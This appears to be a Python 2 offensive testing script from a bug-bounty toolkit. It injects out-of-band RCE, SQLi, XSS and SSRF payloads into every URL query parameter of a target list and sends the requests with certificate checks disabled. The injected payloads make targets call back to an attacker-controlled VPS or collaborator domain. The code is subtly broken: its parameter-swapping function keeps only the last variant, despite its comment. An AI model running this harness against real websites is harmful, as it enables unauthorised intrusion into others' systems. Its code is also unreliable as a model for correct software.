# coding: utf-8
#
### CREATED BY KARMAZ
#
#
### TO DO: 
# 1. add payload identification
### FUNCTIONS:
# 1. TEST URLS FOR OUT-OF-BAND EXPLOITATION.
# 2. TEST RCE
# 3. TEST SQLI
# 4. TEST XSS
# 5. TEST SSRF
###
# USAGE EXAMPLE:
#   ./crimson_oobtester.py \
#       -i "45.77.94.76" \
#       -d "6jqzryc8olgv0qt732epxdxokfq5eu.collaborator.afine.com" \
#       -p "/home/karmaz/words/exp/oob.txt" 
#       -l "params.txt"
#
# PAYLOAD LINE PROPER FORMAT:
#   [payload]vps_ip
#   [PAYLOAD]domain_collab
###
import sys
import time
import getopt
import urlparse
import requests
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
import os, ssl
if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context
HOME = os.getenv('HOME')
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


### OPTIONS ---
full_cmd_arguments = sys.argv
argument_list = full_cmd_arguments[1:]
short_options = "i:d:h:l:p:"
long_options = ["ip", "domain", "headers", "wordlist","payloads"]
try:
        arguments, values = getopt.getopt(argument_list, short_options, long_options)
except getopt.error as err:
        sys.exit(2)
### --- (They will be iterated at the bottom of the screen ---


# EDIT PAYLOAD LIST WITH GIVE vps_ip AND domain_collab
def edit_payloads(vps_ip,domain_collab,file_with_payloads):
    list_of_payloads = []
    with open(file_with_payloads) as payloads:
        for payload in payloads:
            if "vps_ip" in payload:
                list_of_payloads.append(payload.replace("vps_ip",vps_ip).rstrip())
            elif "domain_collab" in payload:
                list_of_payloads.append(payload.replace("domain_collab",domain_collab).rstrip())
    return list_of_payloads


# PUT PAYLOAD IN EVERY QUERY IN URL AND RETURN AS swapped_url
def paramjuggler(url,payload):
    parsed=urlparse.urlparse(url)
    #Extract queries table
    queries=parsed.query.split("&")
    for i,query in enumerate(queries):
        result = []
        new_queries = []
        new_queries = queries[:]
        new_parsed = ""
        #Extract the param from query
        param=(queries[i].split("=")[0] + "=")
        new_param=param+payload
        new_queries[i] = new_param
        new_parsed = parsed._replace(query="&".join(new_queries))
        result.append(urlparse.urlunparse(new_parsed))
        swapped_url = ("".join(result).rstrip())

    return swapped_url


# DO PARAMJUGGLER FOR EVERY RETURN LIST swapped_urls
def edit_urls(list_of_urls,list_of_payloads):
    swapped_urls = []
    with open(list_of_urls) as urls:
        for url in urls:
            for payload in list_of_payloads:
                swapped_urls.append(paramjuggler(url,payload))
    
    return(swapped_urls)


# SEND REQUESTS AND PRINT LOG
def send_payloads_url(swapped_urls):
    id = 0
    for url in swapped_urls:
        id+=1
        requests.get(url, verify=False)
        print("ID: " + str(id) + " - TIME: " + str(datetime.now().time().strftime("%H:%M:%S")) + " - URL: " + url)


### OPTIONS ---
for current_argument, current_value in arguments:
    if current_argument in ("-i", "--ip"):
        vps_ip = current_value
    elif current_argument in ("-d", "--domain"):
        domain_collab = current_value
    elif current_argument in ("-h", "--headers"):
        list_of_headers = current_value
    elif current_argument in ("-l", "--wordlist"):
        list_of_urls = current_value
    elif current_argument in ("-p", "--payloads"):
        file_with_payloads = current_value
### ---

# MAIN()
# 1) Change the ip and domain in payload list
list_of_payloads = edit_payloads(vps_ip,domain_collab,file_with_payloads)
# 2) Create list of urls with payloads
swapped_urls = edit_urls(list_of_urls,list_of_payloads)
# 3) Send requests and print the time 
send_payloads_url(swapped_urls)

